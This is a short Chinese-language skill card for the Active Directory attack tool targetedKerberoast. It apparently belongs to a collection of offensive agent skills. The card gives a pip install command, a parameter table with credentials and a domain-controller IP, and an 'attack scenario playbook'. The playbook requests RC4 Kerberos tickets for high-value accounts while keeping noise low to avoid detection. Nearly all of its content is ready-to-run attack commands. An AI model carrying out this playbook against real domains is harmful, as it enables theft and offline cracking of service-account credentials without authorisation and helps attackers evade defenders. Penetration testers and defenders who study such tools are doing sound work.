---
name: targetedkerberoast-ad
description: targetedKerberoast: 精确 Kerberoast 攻击。信号:ad攻击,域渗透,线程。
---

# targetedKerberoast

- 攻击大类:C30 AD域渗透与域控攻击
- 上游仓库:https://github.com/ShutdownRepo/targetedKerberoast
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install git+https://github.com/ShutdownRepo/targetedKerberoast
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `targetedkerberoast -d corp.local -u svc -p pass -dc-ip 10.0.0.1` | 精准 Kerberoast |
| `-d d -u u -p p --dc-ip ip -t 20` | 线程 |
| `-o out.txt` | 输出 |

## 攻击场景 Playbook

### 精确 Kerberoast 攻击

```bash
targetedkerberoast -d corp.local -u svc -p pass
# 只对高价值账户请求 RC4 票据,降低噪音
```

## 注意事项

ShutdownRepo 出品,定向 Kerberoast 而非全网 roast。
